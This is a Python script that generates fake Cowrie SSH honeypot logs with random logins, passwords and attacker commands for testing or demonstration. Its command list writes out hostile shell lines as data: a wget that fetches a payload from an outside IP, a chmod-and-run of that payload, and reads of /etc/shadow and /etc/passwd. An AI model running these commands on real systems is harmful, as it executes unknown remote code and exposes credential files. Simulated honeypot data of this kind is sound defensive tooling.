import json, random, time, argparse
from datetime import datetime, timezone, timedelta
from pathlib import Path

LOG_FILE = Path(__file__).parent.parent / "logs" / "cowrie_logs.json"
LOG_FILE.parent.mkdir(parents=True, exist_ok=True)

USERNAMES = ["root","admin","user","test","guest","oracle","ubuntu","pi","staff","staff1","angel","deploy"]
PASSWORDS = ["123456","password","admin","root","toor","pass","1234","staff123","angel123","qwerty","letmein"]
COMMANDS  = ["ls -la","cat /etc/passwd","wget http://185.220.101.42/payload.sh","uname -a","id","whoami","cat /etc/shadow","chmod +x payload.sh && ./payload.sh","find / -perm -4000 2>/dev/null","history"]
ATTACKER_IPS = ["185.220.101.42","89.248.167.131","45.33.32.156","198.54.117.200","94.102.49.190","91.240.118.222","192.168.1.22","10.0.0.14","172.16.5.33","192.168.1.35"]
EVENTS  = ["login_failed","login_success","command","disconnect","connect"]
WEIGHTS = [55, 5, 20, 12, 8]

def make_event(ts=None):
    if ts is None:
        ts = datetime.now(timezone.utc)
    etype = random.choices(EVENTS, weights=WEIGHTS)[0]
    return {
        "timestamp":    ts.isoformat(),
        "event_type":   etype,
        "source_ip":    random.choice(ATTACKER_IPS),
        "username":     random.choice(USERNAMES) if etype in ("login_failed","login_success") else None,
        "password":     random.choice(PASSWORDS) if etype in ("login_failed","login_success") else None,
        "command":      random.choice(COMMANDS)  if etype == "command" else None,
        "session_id":   "sess_{:08x}".format(random.randint(0, 0xFFFFFFFF)),
        "port":         22,
        "duration_sec": random.randint(1,90) if etype in ("disconnect","command") else None,
    }

def generate_batch(n=30):
    now = datetime.now(timezone.utc)
    events = []
    for _ in range(n):
        offset = timedelta(seconds=random.randint(0, 600))
        events.append(make_event(now - offset))
    events.sort(key=lambda e: e["timestamp"])
    return events

def load_existing():
    if LOG_FILE.exists():
        try: return json.loads(LOG_FILE.read_text(encoding="utf-8"))
        except: return []
    return []

def save(events):
    existing = load_existing()
    combined = existing + events
    if len(combined) > 1000:
        combined = combined[-1000:]
    LOG_FILE.write_text(json.dumps(combined, indent=2), encoding="utf-8")
    return len(combined)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--loop",  action="store_true")
    parser.add_argument("--batch", type=int, default=30)
    args = parser.parse_args()
    if args.loop:
        print(f"[Cowrie] Running — writing to: {LOG_FILE}")
        while True:
            batch = generate_batch(args.batch)
            total = save(batch)
            print(f"[Cowrie] {datetime.now().strftime('%H:%M:%S')} — +{len(batch)} events  total={total}")
            time.sleep(10)
    else:
        batch = generate_batch(args.batch)
        total = save(batch)
        print(f"[Cowrie] Generated {len(batch)} events  total={total}")

if __name__ == "__main__":
    main()
